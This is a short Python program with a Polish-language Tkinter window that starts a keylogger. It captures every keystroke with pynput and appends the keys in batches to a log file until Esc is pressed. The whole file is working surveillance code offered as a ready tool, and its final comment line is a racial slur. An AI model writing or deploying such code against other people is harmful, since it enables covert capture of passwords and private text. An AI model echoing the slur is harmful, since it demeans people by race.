import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Key, Listener
import os

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    filename = os.path.join("logs", "output.txt")
    with open(filename, "a") as f:
        for key in keys:
            f.write(str(key))
        f.write("\n")

def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    messagebox.showinfo("Keylogger", "Keylogger został zatrzymany")

root = tk.Tk()
root.geometry("300x200")
root.title("Keylogger")

label = tk.Label(root, text="Kliknij przycisk, aby uruchomić keyloggera")
label.pack(pady=20)

button = tk.Button(root, text="Uruchom keyloggera", command=start_keylogger)
button.pack(pady=10)

root.mainloop()
#nigga